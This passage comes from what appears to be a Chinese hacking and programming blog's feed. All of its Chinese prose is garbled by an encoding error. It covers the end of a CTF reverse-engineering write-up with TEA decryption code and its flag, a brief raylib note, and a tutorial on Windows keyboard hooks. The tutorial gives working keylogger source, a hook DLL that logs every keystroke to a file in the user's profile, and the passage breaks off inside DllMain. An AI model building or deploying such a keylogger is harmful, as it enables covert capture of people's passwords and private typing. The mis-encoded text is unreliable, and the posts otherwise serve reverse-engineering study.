å¯¹åº”äºåŸä»£ç ä¸­çš„ v4</span></span><br><span class="line"><span class="type">int</span> temp1, temp2, temp3, temp4, temp5; <span class="comment">// å¯¹åº”äºåŸä»£ç ä¸­çš„ v5, v6, v7, v8, v9</span></span><br><span class="line"><span class="type">int</span> temp6; <span class="comment">// å¯¹åº”äºåŸä»£ç ä¸­çš„ v10</span></span><br><span class="line"><span class="type">int</span> temp7; <span class="comment">// å¯¹åº”äºåŸä»£ç ä¸­çš„ v11</span></span><br><span class="line"><span class="type">int</span> key_value; <span class="comment">// å¯¹åº”äºåŸä»£ç ä¸­çš„ v12</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> input_second; <span class="comment">// å¯¹åº”äºåŸä»£ç ä¸­çš„ v13</span></span><br><span class="line"><span class="type">int</span> delta; <span class="comment">// å¯¹åº”äºåŸä»£ç ä¸­çš„ v14</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> input_first; <span class="comment">// å¯¹åº”äºåŸä»£ç ä¸­çš„ v15</span></span><br><span class="line"><span class="type">int</span> key = <span class="number">3</span>;</span><br><span class="line"></span><br><span class="line">input_second = input[<span class="number">1</span>];</span><br><span class="line">delta = <span class="number">0x987E55D0</span>;</span><br><span class="line">input_first = *input;</span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">&#123;</span><br><span class="line">input_second -= (delta + input_first) ^ (key_array[<span class="number">3</span>] + (input_first &gt;&gt; <span class="number">4</span>)) ^ (key_array[<span class="number">2</span>] + <span class="number">32</span> * input_first);</span><br><span class="line">input_first -= (delta + input_second) ^ (key_array[<span class="number">1</span>] + (input_second &gt;&gt; <span class="number">4</span>)) ^ (key_array[<span class="number">0</span>] + <span class="number">32</span> * input_second);</span><br><span class="line"></span><br><span class="line">delta += <span class="number">0x61CBB648</span>;</span><br><span class="line">&#125; <span class="keyword">while</span> (delta != <span class="number">0</span>);</span><br><span class="line">*input = input_first;</span><br><span class="line">input[<span class="number">1</span>] = input_second;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">(<span class="type">void</span>)</span> </span>&#123;</span><br><span class="line">BYTE last[] = &#123; <span class="number">211</span>, <span class="number">109</span>, <span class="number">186</span>, <span class="number">193</span>, <span class="number">54</span>, <span class="number">101</span>, <span class="number">42</span>, <span class="number">137</span>, <span class="number">120</span>, <span class="number">145</span>, <span class="number">245</span>, <span class="number">49</span>, <span class="number">250</span>, <span class="number">190</span>, <span class="number">194</span>, <span class="number">49</span>, <span class="number">144</span>, <span class="number">12</span>, <span class="number">68</span>, <span class="number">67</span>, <span class="number">212</span>, <span class="number">174</span>, <span class="number">66</span>, <span class="number">69</span> , <span class="number">0</span>&#125;;</span><br><span class="line">BYTE data[<span class="number">24</span>] = &#123;</span><br><span class="line"><span class="number">0xF7</span>, <span class="number">0xA1</span>, <span class="number">0x04</span>, <span class="number">0xD8</span>, <span class="number">0xD3</span>, <span class="number">0xF7</span>, <span class="number">0x2F</span>, <span class="number">0x25</span>, <span class="number">0x06</span>, <span class="number">0x91</span>, <span class="number">0xF9</span>, <span class="number">0xEC</span>, <span class="number">0xDD</span>, <span class="number">0x03</span>, <span class="number">0xC8</span>, <span class="number">0xA9</span>,</span><br><span class="line"><span class="number">0xE1</span>, <span class="number">0x84</span>, <span class="number">0xF0</span>, <span class="number">0xFE</span>, <span class="number">0xAF</span>, <span class="number">0x4E</span>, <span class="number">0xDF</span>, <span class="number">0xD1</span></span><br><span class="line">&#125;;</span><br><span class="line">DWORD rkey[<span class="number">4</span>] = &#123;</span><br><span class="line"><span class="number">0x00000003</span>, <span class="number">0x00000005</span>, <span class="number">0x00000008</span>, <span class="number">0x0000000D</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="built_in">may_ini</span>((DWORD*)last, rkey);</span><br><span class="line">DWORD rkey2[<span class="number">4</span>] = &#123;</span><br><span class="line"><span class="number">0x00000015</span>, <span class="number">0x00000022</span>, <span class="number">0x00000037</span>, <span class="number">0x00000059</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="built_in">may_ini</span>((DWORD*)last + <span class="number">2</span>, rkey2);</span><br><span class="line">DWORD rkey3[<span class="number">4</span>] = &#123;</span><br><span class="line"><span class="number">0x00000090</span>, <span class="number">0x000000E9</span>, <span class="number">0x00000179</span>, <span class="number">0x00000262</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="built_in">may_ini</span>((DWORD*)last + <span class="number">4</span>, rkey3);</span><br><span class="line">std::cout &lt;&lt; (<span class="type">char</span>*)last;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>teaæµç¨‹ä¹‹ååé¢å¥½åƒxoräº†å¥½å¤šä¸œè¥¿ï¼ŒæŠŠæ¯ä¸ªåœ°å€éƒ½æ”¹å</p><p><img src="https://s2.loli.net/2024/07/07/ZAy7cQHEmurkDh2.png" alt="image-20240707151103500"></p><p>ç„¶åå¯¹æœ€åæ£€æŸ¥çš„åœ°å€ä¸‹è¯»å†™æ–­ç‚¹ï¼Œå‘ç°ç¬¬ä¸€æ¬¡å†™å…¥æ—¶æ˜¯å€’åºä¼ å…¥</p><p>ç„¶åå¼‚æˆ–äº†0x33</p><p>é‚£ä¹ˆæŠŠæœ€åçš„å€¼å€’åºç„¶åå¼‚æˆ–ï¼Œç„¶åè§£å¯†teaå³å¯å¾—åˆ°flag</p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;<span class="symbol">y0u_reallyl1ke_te@</span>&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> é¢˜é›† </category>
          
          <category> CTF </category>
          
          <category> æ¯”èµ› </category>
          
      </categories>
      
      
        <tags>
            
            <tag> RE </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>raylibå­¦ä¹ </title>
      <link href="/posts/aa7cf3e8.html"/>
      <url>/posts/aa7cf3e8.html</url>
      
        <content type="html"><![CDATA[<p>ç”±äºCè¯­è¨€å·¥ç¨‹å®è·µè¦ç”¨å›¾å½¢åŒ–ç•Œé¢ï¼Œæ‰€ä»¥æˆ‘å‡†å¤‡å¼€å§‹å­¦ä¸€ä¸‹raylib<br>å› ä¸ºæˆ‘è§‰å¾—å¾ˆå¥½çœ‹</p><p>ä¸‹è½½æ–¹å¼ï¼š</p><p><a href="https://www.raylib.com/">raylib | A simple and easy-to-use library to enjoy videogames programming</a></p><p>å®ƒæœ¬èº«ä¸æ˜¯å•çº¯çš„å›¾å½¢åº“ï¼Œè€Œæ˜¯é›†æˆçš„æ¸¸æˆå¼€å‘å·¥å…·</p><p>å…¶ä¸­çš„rayguiæ‰æ˜¯æˆ‘è¿™æ¬¡å‡†å¤‡å­¦çš„é‡ç‚¹</p><p>ç¼–è¯‘ï¼š</p><p><a href="https://blog.csdn.net/qq_37661242/article/details/123279843">VSCode + Mingwå®‰è£…raylib_raylibå®‰è£…-CSDNåšå®¢</a></p><p>è¦ä½¿ç”¨å›¾å½¢åº“æ—¶</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> RAYGUI_IMPLEMENTATION</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;raygui.h&quot;</span></span></span><br></pre></td></tr></table></figure><p>ç„¶åå°è¯•ç”¨å†…ç½®çš„æ“ä½œå†™ä»£ç ï¼Œä½¿ç”¨vscodeå’Œcmakeï¼Œæµ‹è¯•æˆåŠŸ</p><p>è‡³äºvsï¼Œä¹‹åå†è¯•ã€‚</p>]]></content>
      
      
      <categories>
          
          <category> å®è·µ </category>
          
          <category> ç¼–ç¨‹ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> cpp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ã€Šé€†æ ¸ã€‹07-é”®ç›˜hookå’ŒDLLæ³¨å…¥</title>
      <link href="/posts/8535f1d8.html"/>
      <url>/posts/8535f1d8.html</url>
      
        <content type="html"><![CDATA[<p>ä¹‹å‰å°è¯•è¿‡å¯¹å‡½æ•°çš„hookï¼Œè¿™æ¬¡å‚è€ƒäº†ã€Šé€†å‘å·¥ç¨‹æ ¸å¿ƒåŸç†ã€‹ï¼Œå°è¯•ä½¿ç”¨windowsçš„ç³»ç»Ÿå‡½æ•°åœ¨ç³»ç»Ÿå±‚é¢å¯¹messageè¿›è¡Œhook</p><hr><h2 id="æ¶ˆæ¯">æ¶ˆæ¯</h2><p>Windowsæ˜¯ä»¥äº‹ä»¶é©±åŠ¨æ¥å·¥ä½œçš„ã€‚æ¯å½“ç”¨æˆ·æ‰§è¡Œä¸€ä¸ªæ“ä½œï¼Œéƒ½ä¼šè®©OSæŠŠå¯¹åº”çš„æ¶ˆæ¯å‘é€ç»™ç›¸åº”çš„åº”ç”¨ç¨‹åºã€‚</p><p>æ¯ä¸ªæ¶ˆæ¯éƒ½æ˜¯ä¸€ä¸ªç»“æ„ï¼Œå…¶ä¸­çš„messageæ˜¯å¯¹åº”çš„æ¶ˆæ¯ç±»åˆ«ï¼Œ32ä½</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">tagMsg</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">       HWND    hwnd;       <span class="comment">//æ¥å—è¯¥æ¶ˆæ¯çš„çª—å£å¥æŸ„</span></span><br><span class="line">       UINT    message;    <span class="comment">//æ¶ˆæ¯å¸¸é‡æ ‡è¯†ç¬¦ï¼Œä¹Ÿå°±æ˜¯æˆ‘ä»¬é€šå¸¸æ‰€è¯´çš„æ¶ˆæ¯å·</span></span><br><span class="line">       WPARAM  wParam;     <span class="comment">//32ä½æ¶ˆæ¯çš„ç‰¹å®šé™„åŠ ä¿¡æ¯ï¼Œç¡®åˆ‡å«ä¹‰ä¾èµ–äºæ¶ˆæ¯å€¼</span></span><br><span class="line">       LPARAM  lParam;     <span class="comment">//32ä½æ¶ˆæ¯çš„ç‰¹å®šé™„åŠ ä¿¡æ¯ï¼Œç¡®åˆ‡å«ä¹‰ä¾èµ–äºæ¶ˆæ¯å€¼</span></span><br><span class="line">       DWORD   time;       <span class="comment">//æ¶ˆæ¯åˆ›å»ºæ—¶çš„æ—¶é—´</span></span><br><span class="line">       POINT   pt;         <span class="comment">//æ¶ˆæ¯åˆ›å»ºæ—¶çš„é¼ æ ‡/å…‰æ ‡åœ¨å±å¹•åæ ‡ç³»ä¸­çš„ä½ç½®</span></span><br><span class="line">&#125;MSG;</span><br></pre></td></tr></table></figure><p>æ ‡è¯†ç¬¦ï¼š</p><blockquote><figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">WM_NULL<span class="comment">---0x0000    ç©ºæ¶ˆæ¯ã€‚</span></span><br><span class="line"><span class="number">0</span>x0001<span class="comment">----0x0087    ä¸»è¦æ˜¯çª—å£æ¶ˆæ¯ã€‚</span></span><br><span class="line"><span class="number">0</span>x00A0<span class="comment">----0x00A9    éå®¢æˆ·åŒºæ¶ˆæ¯ </span></span><br><span class="line"><span class="number">0</span>x0100<span class="comment">----0x0108    é”®ç›˜æ¶ˆæ¯</span></span><br><span class="line"><span class="number">0</span>x0111<span class="comment">----0x0126    èœå•æ¶ˆæ¯</span></span><br><span class="line"><span class="number">0</span>x0132<span class="comment">----0x0138    é¢œè‰²æ§åˆ¶æ¶ˆæ¯</span></span><br><span class="line"><span class="number">0</span>x0200<span class="comment">----0x020A    é¼ æ ‡æ¶ˆæ¯</span></span><br><span class="line"><span class="number">0</span>x0211<span class="comment">----0x0213    èœå•å¾ªç¯æ¶ˆæ¯</span></span><br><span class="line"><span class="number">0</span>x0220<span class="comment">----0x0230    å¤šæ–‡æ¡£æ¶ˆæ¯</span></span><br><span class="line"><span class="number">0</span>x03E0<span class="comment">----0x03E8    DDEæ¶ˆæ¯</span></span><br><span class="line"><span class="number">0</span>x0400             WM_USER</span><br><span class="line"><span class="number">0</span>x8000             WM_APP</span><br><span class="line"><span class="number">0</span>x0400<span class="comment">----0x7FFF    åº”ç”¨ç¨‹åºè‡ªå®šä¹‰ç§æœ‰æ¶ˆæ¯</span></span><br></pre></td></tr></table></figure></blockquote><p>æ¶ˆæ¯åˆ†ä¸ºï¼š</p><ul><li>çª—å£æ¶ˆæ¯ï¼šå¯¹çª—å£çš„æ“ä½œè§¦å‘çª—å£æ¶ˆæ¯ï¼šåˆ›å»ºçª—å£ï¼Œç§»åŠ¨çª—å£ï¼Œå•æœºé¼ æ ‡</li><li>å‘½ä»¤æ¶ˆæ¯ï¼šå±äºçª—å£æ¶ˆæ¯ï¼Œå¤„ç†ä»ä¸€ä¸ªçª—å£å‘é€åˆ°å¦ä¸€ä¸ªçª—å£çš„ç”¨æˆ·è¯·æ±‚ï¼Œæ¯”å¦‚æŒ‰ä¸‹æŒ‰é’®</li><li>æ§ä»¶é€šçŸ¥æ¶ˆæ¯ï¼šç”¨äºå­çª—å£é€šçŸ¥çˆ¶çª—å£</li></ul><p>æ¯ä¸€ä¸ªç¨‹åºåœ¨æ‰§è¡Œåï¼Œéƒ½å­˜åœ¨ä¸€ä¸ªæ¶ˆæ¯é˜Ÿåˆ—ï¼Œè¿›ç¨‹é€šè¿‡ç¬¬ä¸€æ¬¡è°ƒç”¨GDIå‡½æ•°åˆ›å»ºä¸€ä¸ªé˜Ÿåˆ—ã€‚æ‰€æœ‰æ¶ˆæ¯éƒ½å­˜æ”¾åœ¨è¿™ä¸ªé˜Ÿåˆ—ä¸­ï¼Œåº”ç”¨ç¨‹åºé€šè¿‡ä¸€ä¸ªæ¶ˆæ¯å¾ªç¯ï¼Œè¯»å–å…¶ä¸­çš„æ¶ˆæ¯å¹¶å“åº”ã€‚æ¶ˆæ¯é˜Ÿåˆ—åˆ†ä¸ºç³»ç»Ÿæ¶ˆæ¯é˜Ÿåˆ—å’Œçº¿ç¨‹æ¶ˆæ¯é˜Ÿåˆ—ï¼Œç³»ç»Ÿæ¶ˆæ¯é˜Ÿåˆ—ç”±Windowsç»´æŠ¤ï¼Œçº¿ç¨‹æ¶ˆæ¯é˜Ÿåˆ—ç”±GUIçº¿ç¨‹ç»´æŠ¤ã€‚</p><p>ä»¥é¼ æ ‡ç‚¹å‡»ä¸¾ä¾‹ï¼š</p><p>å½“é¼ æ ‡ç‚¹å‡»æ—¶ï¼Œé©±åŠ¨åˆ›å»ºå¯¹åº”çš„æ¶ˆæ¯ä¼ é€åˆ°ç³»ç»Ÿæ¶ˆæ¯é˜Ÿåˆ—ã€‚å½“æœ‰åº”ç”¨è¦è¯»å–æ—¶ï¼Œç³»ç»Ÿä»ç³»ç»Ÿé˜Ÿåˆ—ä¸­æŠŠå¯¹åº”çš„æ¶ˆæ¯å–å‡ºï¼Œä¼ ç»™å¯¹åº”çš„çº¿ç¨‹æ¶ˆæ¯é˜Ÿåˆ—ã€‚çº¿ç¨‹åœ¨æ¶ˆæ¯çš„è¯»å–å¾ªç¯ä¸­æŠŠæ¶ˆæ¯æ‹¿å‡ºæ¥ï¼Œé€šè¿‡æ“ä½œç³»ç»Ÿå‘é€åˆ°å¯¹åº”çª—å£è¿‡ç¨‹å¤„ç†ã€‚</p><hr><h2 id="hook">hook</h2><p>hookï¼Œå°±æ˜¯åœ¨å®ƒä»¬ä¼ é€’è¿‡ç¨‹ä¸­æ’å…¥è‡ªå·±çš„ä»£ç çš„æ“ä½œã€‚</p><p>ç°åœ¨ç”¨é”®ç›˜é’©å­ä¸¾ä¾‹</p><p>é‡è¦çš„å‡½æ•°æœ‰ä»¥ä¸‹å‡ ä¸ªï¼š</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">SetWindowsHookEx</span>(WH_KEYBOARD, KeyboardProc, g_hInstance, <span class="number">0</span>);<span class="comment">//åˆ›å»ºä¸€ä¸ªé’©å­</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">UnhookWindowsHookEx</span>(g_hHook);<span class="comment">//åˆ é™¤ä¸€ä¸ªé’©å­</span></span><br></pre></td></tr></table></figure><p>æˆ‘ä»¬è¦è°ƒç”¨è¿™ä¸ªapiæ‰§è¡Œé’©å­æ“ä½œï¼Œå¯ä»¥ç›´æ¥æŠŠè¿™ä¸ªå†™åˆ°exeé‡Œé¢ï¼Œä½†æ˜¯è¿™æ ·å°±æ˜¯exeç›‘å¬å…¶å®ƒçš„ï¼Œè€Œä¸æ˜¯ç›´æ¥æŠŠdllæ”¾è¿›å»ï¼Œæ‰€ä»¥æŠŠè¿™ä¸¤ä¸ªå‡½æ•°å†™åˆ°dllé‡Œé¢å¹¶æ·»åŠ dllexportå…³é”®å­—ä½œä¸ºå¯¼å‡ºå‡½æ•°ï¼Œè¿™æ ·å°±å¯ä»¥è¢«å…¶å®ƒè¿›ç¨‹è®¿é—®ï¼Œæˆ‘ä»¬å¯ä»¥ä¸“é—¨å†™ä¸€ä¸ªexeå»æ‰§è¡Œå®ƒ</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">ifdef</span> __cplusplus</span></span><br><span class="line"><span class="keyword">extern</span> <span class="string">&quot;C&quot;</span> &#123;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">__declspec(dllexport) <span class="function"><span class="type">void</span> <span class="title">HookStart</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">g_hHook = <span class="built_in">SetWindowsHookExA</span>(WH_KEYBOARD, KeyboardProc, g_hInstance, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">__declspec(dllexport) <span class="function"><span class="type">void</span> <span class="title">HookStop</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">if</span> (g_hHook)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">UnhookWindowsHookEx</span>(g_hHook);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> __cplusplus</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br></pre></td></tr></table></figure><p>ç„¶åå†å†™é’©å­çš„å›è°ƒå‡½æ•°</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">writeToFile</span><span class="params">(<span class="type">const</span> <span class="type">char</span>* str)</span> </span>&#123;</span><br><span class="line"><span class="type">char</span>* user_dir = <span class="built_in">getenv</span>(<span class="string">&quot;USERPROFILE&quot;</span>);</span><br><span class="line"><span class="keyword">if</span> (user_dir != <span class="literal">NULL</span>) &#123;</span><br><span class="line"><span class="type">char</span> file_path[<span class="number">256</span>];</span><br><span class="line"><span class="built_in">snprintf</span>(file_path, <span class="built_in">sizeof</span>(file_path), <span class="string">&quot;%s\\outputkey.txt&quot;</span>, user_dir);</span><br><span class="line">FILE* fl = <span class="built_in">fopen</span>(file_path, <span class="string">&quot;a+&quot;</span>);</span><br><span class="line"><span class="keyword">if</span> (fl != <span class="literal">NULL</span>) &#123;</span><br><span class="line"><span class="built_in">fwrite</span>(str, <span class="built_in">sizeof</span>(<span class="type">char</span>), <span class="built_in">strlen</span>(str), fl);</span><br><span class="line"><span class="built_in">fclose</span>(fl);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function">LRESULT CALLBACK <span class="title">KeyboardProc</span><span class="params">(<span class="type">int</span> nCode, WPARAM wParam, LPARAM lParam)</span> </span>&#123;</span><br><span class="line"><span class="type">char</span> ch[<span class="number">15</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line"><span class="keyword">if</span> (((DWORD)lParam &amp; <span class="number">0x80000000</span>) &amp;&amp; (HC_ACTION == nCode)) &#123;</span><br><span class="line"><span class="keyword">switch</span> (wParam) &#123;</span><br><span class="line"><span class="keyword">case</span> VK_RETURN:</span><br><span class="line"><span class="built_in">strcpy</span>(ch, <span class="string">&quot;[ENTER]&quot;</span>);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> VK_BACK:</span><br><span class="line"><span class="built_in">strcpy</span>(ch, <span class="string">&quot;[BCAKSPACE]&quot;</span>);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> VK_TAB:</span><br><span class="line"><span class="built_in">strcpy</span>(ch, <span class="string">&quot;[TAB]&quot;</span>);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> VK_MENU: &#123; <span class="built_in">strcpy</span>(ch, <span class="string">&quot;[ALT]&quot;</span>); <span class="keyword">break</span>; &#125;</span><br><span class="line"><span class="keyword">case</span> VK_ESCAPE: &#123; <span class="built_in">strcpy</span>(ch, <span class="string">&quot;[ESC]&quot;</span>); <span class="keyword">break</span>; &#125;</span><br><span class="line"><span class="keyword">case</span> VK_DELETE: &#123; <span class="built_in">strcpy</span>(ch, <span class="string">&quot;[DELETE]&quot;</span>); <span class="keyword">break</span>; &#125;</span><br><span class="line"><span class="keyword">case</span> VK_LEFT: &#123; <span class="built_in">strcpy</span>(ch, <span class="string">&quot;[LEFT]&quot;</span>); <span class="keyword">break</span>; &#125;</span><br><span class="line"><span class="keyword">case</span> VK_UP: &#123; <span class="built_in">strcpy</span>(ch, <span class="string">&quot;[RIGHT]&quot;</span>); <span class="keyword">break</span>; &#125;</span><br><span class="line"><span class="keyword">case</span> VK_RIGHT: &#123; <span class="built_in">strcpy</span>(ch, <span class="string">&quot;[RIGHT]&quot;</span>); <span class="keyword">break</span>; &#125;</span><br><span class="line"><span class="keyword">case</span> VK_DOWN: &#123; <span class="built_in">strcpy</span>(ch, <span class="string">&quot;[DOWN]&quot;</span>); <span class="keyword">break</span>; &#125;</span><br><span class="line"><span class="keyword">case</span> VK_LWIN: &#123; <span class="built_in">strcpy</span>(ch, <span class="string">&quot;[WIN KEY]&quot;</span>); <span class="keyword">break</span>; &#125;</span><br><span class="line"><span class="keyword">case</span> VK_RWIN: &#123; <span class="built_in">strcpy</span>(ch, <span class="string">&quot;[WIN KEY]&quot;</span>); <span class="keyword">break</span>; &#125;</span><br><span class="line"><span class="keyword">case</span> VK_LCONTROL: &#123; <span class="built_in">strcpy</span>(ch, <span class="string">&quot;[CTRL]&quot;</span>);  <span class="keyword">break</span>; &#125;</span><br><span class="line"><span class="keyword">case</span> VK_RCONTROL: &#123; <span class="built_in">strcpy</span>(ch, <span class="string">&quot;[CTRL]&quot;</span>);  <span class="keyword">break</span>; &#125;</span><br><span class="line"><span class="keyword">case</span> VK_F1: &#123; <span class="built_in">strcpy</span>(ch, <span class="string">&quot;[F1]&quot;</span>); <span class="keyword">break</span>; &#125;</span><br><span class="line"><span class="keyword">case</span> VK_F2: &#123; <span class="built_in">strcpy</span>(ch, <span class="string">&quot;[F2]&quot;</span>); <span class="keyword">break</span>; &#125;</span><br><span class="line"><span class="keyword">case</span> VK_F3: &#123; <span class="built_in">strcpy</span>(ch, <span class="string">&quot;[F3]&quot;</span>); <span class="keyword">break</span>; &#125;</span><br><span class="line"><span class="keyword">case</span> VK_F4: &#123; <span class="built_in">strcpy</span>(ch, <span class="string">&quot;[F4]&quot;</span>); <span class="keyword">break</span>; &#125;</span><br><span class="line"><span class="keyword">case</span> VK_F5: &#123; <span class="built_in">strcpy</span>(ch, <span class="string">&quot;[F5]&quot;</span>); <span class="keyword">break</span>; &#125;</span><br><span class="line"><span class="keyword">case</span> VK_F6: &#123; <span class="built_in">strcpy</span>(ch, <span class="string">&quot;[F6]&quot;</span>); <span class="keyword">break</span>; &#125;</span><br><span class="line"><span class="keyword">case</span> VK_F7: &#123; <span class="built_in">strcpy</span>(ch, <span class="string">&quot;[F7]&quot;</span>); <span class="keyword">break</span>; &#125;</span><br><span class="line"><span class="keyword">case</span> VK_F8: &#123; <span class="built_in">strcpy</span>(ch, <span class="string">&quot;[F8]&quot;</span>); <span class="keyword">break</span>; &#125;</span><br><span class="line"><span class="keyword">case</span> VK_F9: &#123; <span class="built_in">strcpy</span>(ch, <span class="string">&quot;[F9]&quot;</span>); <span class="keyword">break</span>; &#125;</span><br><span class="line"><span class="keyword">case</span> VK_F10: &#123; <span class="built_in">strcpy</span>(ch, <span class="string">&quot;[F10]&quot;</span>); <span class="keyword">break</span>; &#125;</span><br><span class="line"><span class="keyword">case</span> VK_F11: &#123; <span class="built_in">strcpy</span>(ch, <span class="string">&quot;[F11]&quot;</span>); <span class="keyword">break</span>; &#125;</span><br><span class="line"><span class="keyword">case</span> VK_F12: &#123; <span class="built_in">strcpy</span>(ch, <span class="string">&quot;[F12]&quot;</span>); <span class="keyword">break</span>; &#125;</span><br><span class="line"><span class="keyword">default</span>:</span><br><span class="line">BYTE ks[<span class="number">256</span>];</span><br><span class="line"><span class="built_in">GetKeyboardState</span>(ks);</span><br><span class="line">WORD w;</span><br><span class="line">UINT scan = <span class="number">0</span>;</span><br><span class="line"><span class="built_in">ToAscii</span>(wParam, scan, ks, &amp;w, <span class="number">0</span>);</span><br><span class="line">ch[<span class="number">0</span>] = <span class="built_in">char</span>(w);</span><br><span class="line">ch[<span class="number">1</span>] = <span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">writeToFile</span>(ch);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="built_in">CallNextHookEx</span>(g_hHook, nCode, wParam, lParam);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿™æ—¶dllmainå°±å¯ä»¥ä»€ä¹ˆéƒ½ä¸å¹²äº†ï¼Œåªç”¨æ‰¾åˆ°å½“å‰è¿›ç¨‹å¥æŸ„å°±å¥½</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">BOOL APIENTRY <span class="title">DllMain</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">HMODULE hinstDLL,</span></span></span><br><span class="line"><span class="params"><span class="function">DWORD  dwReason,</span></span></span><br><span class="line"><span class="params"><span class="function">LPVOID lParam</span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">switch</span> (dwReason)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">case</span> DLL_PROCESS_ATTACH:</span><br><span class="line">g_hInstance = hinstDLL;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> DLL_THREAD_ATTACH:</span><br><span class="line"><span 